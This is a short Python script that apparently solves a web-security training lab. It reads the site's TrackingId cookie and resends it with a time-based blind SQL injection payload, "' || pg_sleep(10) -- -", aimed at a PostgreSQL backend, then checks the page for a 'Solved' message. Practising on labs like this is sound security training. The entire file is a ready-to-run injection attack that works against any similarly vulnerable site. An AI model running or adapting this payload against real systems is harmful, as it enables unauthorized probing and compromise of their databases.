import requests
import re

def get_trackingid(session, domain):
    session.get(domain)
    cookie = session.cookies.get_dict()
    tracking_id = cookie['TrackingId']
    return tracking_id

def solve_lab(session, domain, tracking_id):
    payload = tracking_id + "' || pg_sleep(10) -- -"
    r = session.get(domain, cookies={'TrackingId': payload})
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved.')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        tracking_id = get_trackingid(session, domain)
        solve_lab(session, domain, tracking_id)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')